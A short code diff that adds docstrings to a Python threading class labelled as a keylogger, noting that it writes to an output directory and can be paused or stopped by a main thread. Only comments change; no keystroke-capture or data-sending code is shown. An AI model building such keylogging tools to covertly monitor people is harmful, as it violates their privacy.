@@ -9,7 +9,10 @@ import os
 from queue import Queue
 
 print_lock = threading.Lock()
-
+"""
+Thread for the keylogger
+Takes in the output directory as an argument
+"""
 class logger(threading.Thread):
 	outputDir = "null"
 	paused = False
@@ -27,7 +30,11 @@ class logger(threading.Thread):
 		global paused
 		return paused	
 		
-		
+	"""
+	This method, and the same method on the other thread classes, continuously checks the 
+	internal queue for messages from the main thread.
+	This allows the main thread to pause, stop, resume, etc. this thread.
+	"""
 	def run(self):
 		print(threading.currentThread().getName() + " beginning Keylogging")
 		global paused
